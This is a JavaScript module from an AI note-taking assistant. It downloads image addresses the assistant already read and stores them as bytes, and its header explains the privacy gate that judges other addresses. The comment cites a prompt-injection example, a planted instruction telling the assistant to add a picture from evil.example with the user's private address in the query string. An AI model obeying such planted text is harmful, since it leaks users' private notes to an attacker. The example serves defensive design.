/**
 * A PHOTO TEX READ GOES INTO ITS OWN PAGE WITHOUT ANYONE'S YES.
 *
 * A page write may name its pictures by address (`images: [{ name, url }]`,
 * as the page skill tells Tex to). Any address in a note write is a fetch
 * from outside, so it goes to the sharing judge (`privacy/widening.js`),
 * which lets it run only when the person's words ask for it. Nov Babies,
 * 2026-11-11: Seyi wrote "put pictures in your research", the judge read
 * that as not naming the venues' sites, and the page was saved with none,
 * while the automatic hunt (`./pagePhotos.js`) put in pictures from the same
 * kind of sites with no gate, because it hands the save bytes.
 *
 * The gate exists so a planted instruction cannot carry private words out in
 * an address it builds ("add the picture at evil.example/?q=<their
 * address>"; `docs/decisions/privacy-and-sharing/agent-egress.md`). An
 * address the turn itself read on a page or in a search result
 * (`outgoing.vouches`, the rule cards already use) was written by that site,
 * not built from the person's notes, so fetching it is reading in. Each such
 * address is downloaded here and attached as bytes, and the judge is not
 * asked. An address the turn never read is left in the write, so it is still
 * judged. A read address that gives no picture a note can store is dropped,
 * and its name is then hunted for like any other missing photo.
 */

import { storableImage } from "../../notes/uploadedImages.js";
import { within } from "./hunt.js";

/** How long each read address may take to download, all side by side. */
export const READ_IMAGE_TIMEOUT_MS = 8_000;

/**
 * The write with every image address the turn read swapped for its bytes.
 * `vouches(address)` says whether the turn read it; `download(address)`
 * resolves a `data:` picture or null. `kept` and `dropped` name the images.
 */
export async function withReadImages(args, { vouches, download }, { timeoutMs = READ_IMAGE_TIMEOUT_MS } = {}) {
  const images = Array.isArray(args?.images) ? args.images : [];
  const read = images.map((image) => typeof image?.url === "string" && image.data === undefined && typeof vouches === "function" && vouches(image.url.trim()) === true);
  if (!read.includes(true)) return { args, kept: [], dropped: [] };
  const got = await Promise.all(images.map((image, i) => (read[i] ? within(Promise.resolve(download(image.url.trim())).catch(() => null), timeoutMs) : null)));
  const kept = [];
  const dropped = [];
  const next = [];
  images.forEach((image, i) => {
    if (!read[i]) return void next.push(image);
    const data = got[i];
    const stored = typeof data === "string" ? storableImage(data) : null;
    const name = typeof image.name === "string" ? image.name : "";
    if (!stored) return void dropped.push(name);
    const { url: _url, ...rest } = image;
    next.push({ ...rest, data: `data:${stored.contentType};base64,${data.slice(data.indexOf(",") + 1)}` });
    kept.push(name);
  });
  return { args: { ...args, images: next }, kept, dropped };
}
